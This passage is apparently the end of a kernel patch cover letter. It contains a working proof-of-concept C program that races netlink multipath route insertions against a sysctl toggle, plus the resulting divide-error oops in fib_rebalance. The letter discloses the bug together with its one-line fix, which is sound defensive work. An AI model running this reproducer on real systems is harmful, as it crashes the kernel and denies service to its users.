		off += RTA_ALIGN(gw->rta_len);

		rtnh->rtnh_len = off - nh_start;
	}

	return off;
}

static void prepare_devices(void)
{
	run_cmd("ip link del " DEV0 " >/dev/null 2>&1 || true");
	run_cmd("ip link add " DEV0 " type veth peer name " DEV1);
	/* Keep the peer down so DEV0 stays UP with no carrier. */
	run_cmd("ip link set " DEV1 " down");
	run_cmd("ip link set lo up");
	run_cmd("ip addr add " DEV0_ADDR " dev " DEV0);
	run_cmd("ip link set " DEV0 " up");
}

static void prepare_route_state(struct route_state *state, const struct config *cfg)
{
	static char req_buf[MAX_ROUTE_REQ];
	char mp_buf[MAX_MP_BUF];
	size_t mp_len;
	int ifindex;
	struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
	int sndbuf = 1 << 20;

	memset(state, 0, sizeof(*state));

	ifindex = if_nametoindex(DEV0);
	if (!ifindex)
		die("if_nametoindex(" DEV0 ") failed: %s", strerror(errno));

	state->fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
	if (state->fd < 0)
		die("socket(NETLINK_ROUTE) failed: %s", strerror(errno));

	setsockopt(state->fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

	if (bind(state->fd, (struct sockaddr *)&nladdr, sizeof(nladdr)) != 0)
		die("bind(NETLINK_ROUTE) failed: %s", strerror(errno));
	if (connect(state->fd, (struct sockaddr *)&nladdr, sizeof(nladdr)) != 0)
		die("connect(NETLINK_ROUTE) failed: %s", strerror(errno));

	state->nlh = (struct nlmsghdr *)req_buf;
	memset(req_buf, 0, sizeof(req_buf));

	state->nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
	state->nlh->nlmsg_type = RTM_NEWROUTE;
	state->nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE;

	{
		struct rtmsg *rtm = NLMSG_DATA(state->nlh);
		uint32_t dst = htonl(0xc6336401U);
		struct rtattr *dst_rta;

		memset(rtm, 0, sizeof(*rtm));
		rtm->rtm_family = AF_INET;
		rtm->rtm_dst_len = 32;
		rtm->rtm_table = RT_TABLE_MAIN;
		rtm->rtm_protocol = RTPROT_BOOT;
		rtm->rtm_scope = RT_SCOPE_UNIVERSE;
		rtm->rtm_type = RTN_UNICAST;

		dst_rta = (struct rtattr *)((char *)state->nlh +
					   NLMSG_ALIGN(state->nlh->nlmsg_len));
		if (addattr_l(state->nlh, sizeof(req_buf), RTA_DST, &dst, sizeof(dst)) != 0)
			die("failed to add RTA_DST");
		state->dst = (uint32_t *)RTA_DATA(dst_rta);
	}

	mp_len = build_multipath(mp_buf, sizeof(mp_buf), ifindex, cfg->nh_count);
	if (addattr_l(state->nlh, sizeof(req_buf), RTA_MULTIPATH, mp_buf, mp_len) != 0)
		die("failed to add RTA_MULTIPATH");

	state->msg_len = state->nlh->nlmsg_len;
}

static void signal_stop(int signo)
{
	(void)signo;
	stop_flag = 1;
}

static void *toggle_thread(void *arg)
{
	const struct config *cfg = arg;
	int fd;

	set_affinity(cfg->toggle_cpu);

	fd = open(SYSCTL_PATH, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		die("open(%s) failed: %s", SYSCTL_PATH, strerror(errno));

	write_sysctl_value(fd, '1');
	while (!stop_flag) {
		write_sysctl_value(fd, '1');
		spin_usec(cfg->on_usec);
		write_sysctl_value(fd, '0');
		spin_usec(cfg->off_usec);
	}

	close(fd);
	return NULL;
}

static void *route_thread(void *arg)
{
	const struct config *cfg = arg;
	struct route_state state;
	uint32_t seq = 1;
	unsigned long long iters = 0;

	prepare_route_state(&state, cfg);
	set_affinity(cfg->route_cpu);

	while (!stop_flag) {
		uint32_t host_dst = 0xc6336400U | ((seq % 250U) + 1U);
		ssize_t n;

		*state.dst = htonl(host_dst);
		state.nlh->nlmsg_seq = seq++;
		n = send(state.fd, state.nlh, state.msg_len, 0);
		if (n < 0) {
			if (errno == EINTR || errno == EAGAIN || errno == ENOBUFS)
				continue;
			die("send(RTM_NEWROUTE) failed: %s", strerror(errno));
		}

		iters++;
		if ((iters & ((1ULL << 20) - 1ULL)) == 0)
			fprintf(stderr, "route iterations=%llu\n", iters);
	}

	close(state.fd);
	return NULL;
}

int main(void)
{
	struct config cfg;
	pthread_t toggler;
	pthread_t router;

	load_config(&cfg);
	signal(SIGINT, signal_stop);
	signal(SIGTERM, signal_stop);
	signal(SIGALRM, signal_stop);
	if (cfg.timeout_sec)
		alarm(cfg.timeout_sec);

	fprintf(stderr,
		"nh_count=%u on_usec=%u off_usec=%u route_cpu=%d toggle_cpu=%d timeout=%u\n",
		cfg.nh_count, cfg.on_usec, cfg.off_usec, cfg.route_cpu,
		cfg.toggle_cpu, cfg.timeout_sec);

	prepare_devices();

	{
		int fd = open(SYSCTL_PATH, O_WRONLY | O_CLOEXEC);
		if (fd < 0)
			die("open(%s) failed: %s", SYSCTL_PATH, strerror(errno));
		write_sysctl_value(fd, '1');
		close(fd);
	}

	if (pthread_create(&toggler, NULL, toggle_thread, &cfg) != 0)
		die("pthread_create(toggle_thread) failed");
	if (pthread_create(&router, NULL, route_thread, &cfg) != 0)
		die("pthread_create(route_thread) failed");

	pthread_join(router, NULL);
	stop_flag = 1;
	pthread_join(toggler, NULL);
	fprintf(stderr, "completed: worker threads stopped\n");
	return 0;
}

------END poc.c--------

----BEGIN crash log----

Oops: divide error: 0000 [#1] SMP NOPTI
[    2.330521] CPU: 0 UID: 1000 PID: 90 Comm: poc Not tainted 7.2.0-rc7-g24ef02f934ee #6 PREEMPT(lazy) 
[    2.332668] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[    2.335691] RIP: 0010:fib_rebalance (net/ipv4/fib_semantics.c:884)
[    2.336845] Code: 78 45 85 db 75 0a 8b 80 38 01 00 00 85 c0 74 0a 83 e2 10 b8 ff ff ff ff 75 97 44 03 51 28 31 d2 49 63 c2 48 c1 e0 1f 4c 01 c8 <49> f7 f0 83 e8 01 e9 7c ff ff ff 80 7a 66 00 74 0d 48 8b 82 80 00
All code
========
   0:	78 45                	js     0x47
   2:	85 db                	test   %ebx,%ebx
   4:	75 0a                	jne    0x10
   6:	8b 80 38 01 00 00    	mov    0x138(%rax),%eax
   c:	85 c0                	test   %eax,%eax
   e:	74 0a                	je     0x1a
  10:	83 e2 10             	and    $0x10,%edx
  13:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  18:	75 97                	jne    0xffffffffffffffb1
  1a:	44 03 51 28          	add    0x28(%rcx),%r10d
  1e:	31 d2                	xor    %edx,%edx
  20:	49 63 c2             	movslq %r10d,%rax
  23:	48 c1 e0 1f          	shl    $0x1f,%rax
  27:	4c 01 c8             	add    %r9,%rax
  2a:*	49 f7 f0             	div    %r8		<-- trapping instruction
  2d:	83 e8 01             	sub    $0x1,%eax
  30:	e9 7c ff ff ff       	jmp    0xffffffffffffffb1
  35:	80 7a 66 00          	cmpb   $0x0,0x66(%rdx)
  39:	74 0d                	je     0x48
  3b:	48                   	rex.W
  3c:	8b                   	.byte 0x8b
  3d:	82                   	(bad)
  3e:	80                   	.byte 0x80
	...

Code starting with the faulting instruction
===========================================
   0:	49 f7 f0             	div    %r8
   3:	83 e8 01             	sub    $0x1,%eax
   6:	e9 7c ff ff ff       	jmp    0xffffffffffffff87
   b:	80 7a 66 00          	cmpb   $0x0,0x66(%rdx)
   f:	74 0d                	je     0x1e
  11:	48                   	rex.W
  12:	8b                   	.byte 0x8b
  13:	82                   	(bad)
  14:	80                   	.byte 0x80
	...
[    2.342060] RSP: 0018:ffffaf56c02939e8 EFLAGS: 00010206
[    2.343500] RAX: 0000000080000000 RBX: ffff9aa001e0d1c0 RCX: ffff9aa001e09058
[    2.345511] RDX: 0000000000000000 RSI: ffff9aa001e08000 RDI: 0000000000000027
[    2.347680] RBP: ffff9aa00202af40 R08: 0000000000000000 R09: 0000000000000000
[    2.350735] R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000000
[    2.352897] R13: 00000000000000c8 R14: 0000000000000000 R15: ffff9aa001e08000
[    2.354723] FS:  00007fe5ef80b6c0(0000) GS:ffff9aa0d7c69000(0000) knlGS:0000000000000000
[    2.356800] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    2.358243] CR2: 00007fe5f000bb30 CR3: 0000000002340005 CR4: 0000000000370ef0
[    2.360136] Call Trace:
[    2.361049]  <TASK>
[    2.361859]  fib_create_info (net/ipv4/fib_semantics.c:1555)
[    2.362939]  fib_table_insert (net/ipv4/fib_trie.c:1212)
[    2.364077]  ? __nla_validate (lib/nlattr.c:677)
[    2.365309]  ? inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
[    2.366654]  inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
[    2.367913]  ? __pfx_inet_rtm_newroute (net/ipv4/fib_frontend.c:909)
[    2.369521]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7076)
[    2.370708]  ? preempt_schedule_irq (kernel/sched/core.c:7556)
[    2.371839]  ? irqentry_exit (include/linux/irq-entry-common.h:468 include/linux/irq-entry-common.h:539 kernel/entry/common.c:167)
[    2.372923]  ? update_cfs_rq_load_avg (kernel/sched/fair.c:5477)
[    2.373860]  ? __pfx_rtnetlink_rcv_msg (net/core/rtnetlink.c:4441)
[    2.375046]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[    2.376090]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[    2.377155]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[    2.378386]  __sys_sendto (net/socket.c:775 (discriminator 1) net/socket.c:790 (discriminator 1) net/socket.c:2252 (discriminator 1))
[    2.379484]  __x64_sys_sendto (net/socket.c:2259 net/socket.c:2255 net/socket.c:2255)
[    2.380326]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[    2.381347]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[    2.382740] RIP: 0033:0x4268ca
[    2.383641] Code: e0 89 7d e8 89 4d d4 e8 84 a3 02 00 44 8b 55 d4 48 8b 55 d8 45 31 c9 89 c3 48 8b 75 e0 8b 7d e8 45 31 c0 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 36 89 df 48 89 45 e8 e8 d3 a3 02 00 48 8b 45
All code
========
   0:	e0 89                	loopne 0xffffffffffffff8b
   2:	7d e8                	jge    0xffffffffffffffec
   4:	89 4d d4             	mov    %ecx,-0x2c(%rbp)
   7:	e8 84 a3 02 00       	call   0x2a390
   c:	44 8b 55 d4          	mov    -0x2c(%rbp),%r10d
  10:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  14:	45 31 c9             	xor    %r9d,%r9d
  17:	89 c3                	mov    %eax,%ebx
  19:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
  1d:	8b 7d e8             	mov    -0x18(%rbp),%edi
  20:	45 31 c0             	xor    %r8d,%r8d
  23:	b8 2c 00 00 00       	mov    $0x2c,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 36                	ja     0x68
  32:	89 df                	mov    %ebx,%edi
  34:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  38:	e8 d3 a3 02 00       	call   0x2a410
  3d:	48                   	rex.W
  3e:	8b                   	.byte 0x8b
  3f:	45                   	rex.RB

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 36                	ja     0x3e
   8:	89 df                	mov    %ebx,%edi
   a:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   e:	e8 d3 a3 02 00       	call   0x2a3e6
  13:	48                   	rex.W
  14:	8b                   	.byte 0x8b
  15:	45                   	rex.RB
[    2.388647] RSP: 002b:00007fe5ef80b1a0 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[    2.390438] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00000000004268ca
[    2.392222] RDX: 0000000000000ca8 RSI: 00000000004ccb60 RDI: 0000000000000003
[    2.394135] RBP: 00007fe5ef80b1d0 R08: 0000000000000000 R09: 0000000000000000
[    2.395994] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000003
[    2.397818] R13: 0000000000000ca8 R14: 00000000004ccb80 R15: 00000000000006a3
[    2.399591]  </TASK>
[    2.400166] Modules linked in:
[    2.401122] ---[ end trace 0000000000000000 ]---
[    2.402544] RIP: 0010:fib_rebalance (net/ipv4/fib_semantics.c:884)
[    2.403906] Code: 78 45 85 db 75 0a 8b 80 38 01 00 00 85 c0 74 0a 83 e2 10 b8 ff ff ff ff 75 97 44 03 51 28 31 d2 49 63 c2 48 c1 e0 1f 4c 01 c8 <49> f7 f0 83 e8 01 e9 7c ff ff ff 80 7a 66 00 74 0d 48 8b 82 80 00
All code
========
   0:	78 45                	js     0x47
   2:	85 db                	test   %ebx,%ebx
   4:	75 0a                	jne    0x10
   6:	8b 80 38 01 00 00    	mov    0x138(%rax),%eax
   c:	85 c0                	test   %eax,%eax
   e:	74 0a                	je     0x1a
  10:	83 e2 10             	and    $0x10,%edx
  13:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  18:	75 97                	jne    0xffffffffffffffb1
  1a:	44 03 51 28          	add    0x28(%rcx),%r10d
  1e:	31 d2                	xor    %edx,%edx
  20:	49 63 c2             	movslq %r10d,%rax
  23:	48 c1 e0 1f          	shl    $0x1f,%rax
  27:	4c 01 c8             	add    %r9,%rax
  2a:*	49 f7 f0             	div    %r8		<-- trapping instruction
  2d:	83 e8 01             	sub    $0x1,%eax
  30:	e9 7c ff ff ff       	jmp    0xffffffffffffffb1
  35:	80 7a 66 00          	cmpb   $0x0,0x66(%rdx)
  39:	74 0d                	je     0x48
  3b:	48                   	rex.W
  3c:	8b                   	.byte 0x8b
  3d:	82                   	(bad)
  3e:	80                   	.byte 0x80
	...

Code starting with the faulting instruction
===========================================
   0:	49 f7 f0             	div    %r8
   3:	83 e8 01             	sub    $0x1,%eax
   6:	e9 7c ff ff ff       	jmp    0xffffffffffffff87
   b:	80 7a 66 00          	cmpb   $0x0,0x66(%rdx)
   f:	74 0d                	je     0x1e
  11:	48                   	rex.W
  12:	8b                   	.byte 0x8b
  13:	82                   	(bad)
  14:	80                   	.byte 0x80
	...
[    2.408659] RSP: 0018:ffffaf56c02939e8 EFLAGS: 00010206
[    2.410073] RAX: 0000000080000000 RBX: ffff9aa001e0d1c0 RCX: ffff9aa001e09058
[    2.412072] RDX: 0000000000000000 RSI: ffff9aa001e08000 RDI: 0000000000000027
[    2.414443] RBP: ffff9aa00202af40 R08: 0000000000000000 R09: 0000000000000000
[    2.416653] R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000000
[    2.418595] R13: 00000000000000c8 R14: 0000000000000000 R15: ffff9aa001e08000
[    2.420352] FS:  00007fe5ef80b6c0(0000) GS:ffff9aa0d7c69000(0000) knlGS:0000000000000000
[    2.422489] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    2.424033] CR2: 00007fe5f000bb30 CR3: 0000000002340005 CR4: 0000000000370ef0
[    2.425931] poc (90) used greatest stack depth: 12416 bytes left

-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  ipv4: avoid divide by zero in fib_rebalance

 net/ipv4/fib_semantics.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

-- 
2.43.0

